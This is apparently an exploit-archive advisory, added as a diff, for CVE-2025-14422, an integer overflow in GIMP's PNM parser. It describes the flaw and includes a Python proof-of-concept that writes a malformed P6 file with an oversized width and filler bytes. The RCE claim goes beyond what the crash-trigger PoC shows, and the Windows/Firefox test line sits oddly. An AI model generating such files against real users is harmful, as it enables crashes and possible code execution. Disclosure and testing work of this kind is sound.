@@ -1,0 +1,71 @@
+=============================================================================================================================================
+| # Title     : GIMP PNM Integer Overflow                                                                                                   |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.1 (64 bits)                                                            |
+| # Vendor    : https://redhat.com/                                                                                                         |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/214572/ & CVE-2025-14422
+
+[+] Summary    : This discussion centers on a critical security vulnerability discovered in GIMP (GNU Image Manipulation Program), 
+                 specifically within its PNM (Portable Anymap) file parsing logic. The flaw, identified as CVE-2025-14422, 
+				 is an Integer Overflow that occurs when the application processes malformed image headers containing excessively large dimensions.
+
+[+] Key Technical Details:
+
+    The Flaw: When calculating the memory buffer size (Width×Height×3), the result exceeds the maximum value for a 32-bit integer, causing it to "wrap around" to a very small number.
+
+    The Impact: GIMP allocates an undersized buffer based on the overflowed value. When it proceeds to write the actual pixel data from the file into this buffer, a Heap-based Buffer Overflow occurs.
+
+    Risk: This vulnerability allows for Remote Code Execution (RCE). An attacker can execute arbitrary code in the context of the current user simply by tricking them into opening a malicious .pnm file.
+
+    Mitigation: Red Hat and other Linux vendors have released urgent patches (e.g., RHSA-2026:1591). Users must update GIMP to the latest version to close this security gap.
+
+[+] PoC Overview
+
+The provided Python script serves as a Proof of Concept to demonstrate the vulnerability. It generates a .pnm file with:
+
+    A standard P6 header.
+
+    Width set to 0xFFFFFFFF to trigger the mathematical overflow.
+
+    A payload of 5,000 bytes to ensure the undersized buffer is overwhelmed.
+
+
+[+] POC : 
+
+#!/usr/bin/env python3
+
+import struct
+import sys
+
+def create_malicious_pnm(filename):
+    
+    header = b"P6\n"
+    width = 0xFFFFFFFF  
+    height = 2          
+    
+    header += f"{width} {height}\n".encode()
+    header += b"255\n"
+
+    payload = b"A" * 5000 
+    
+    try:
+        with open(filename, 'wb') as f:
+            f.write(header)
+            f.write(payload)
+        print(f"[+] Malicious PNM file created successfully: {filename}")
+        print("[*] WARNING: Do not open this file unless in an isolated test environment.")
+    except Exception as e:
+        print(f"[-] Failed to create file: {e}")
+
+if __name__ == "__main__":
+    if len(sys.argv) != 2:
+        print("Usage: python3 poc.py <filename.pnm>")
+        sys.exit(1)
+    
+    create_malicious_pnm(sys.argv[1])
+		
+Greetings to :============================================================
+jericho * Larry W. Cashdollar * r00t * Malvuln (John Page aka hyp3rlinx)*|
+==========================================================================
